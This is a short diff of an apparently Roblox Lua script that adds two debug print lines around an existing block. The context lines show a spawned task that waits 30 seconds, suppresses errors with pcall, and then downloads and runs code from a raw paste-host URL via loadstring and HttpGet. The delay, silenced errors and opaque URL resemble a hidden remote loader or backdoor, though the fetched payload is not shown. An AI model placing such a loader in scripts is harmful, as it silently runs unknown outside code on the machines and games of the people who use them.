@@ -153,7 +153,9 @@ repeat task.wait() until Solved.value
 --]]
 task.spawn(function()
 pcall(function()
+print("A")
 task.wait(30)
+print("B")
 	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
 end)
 end)
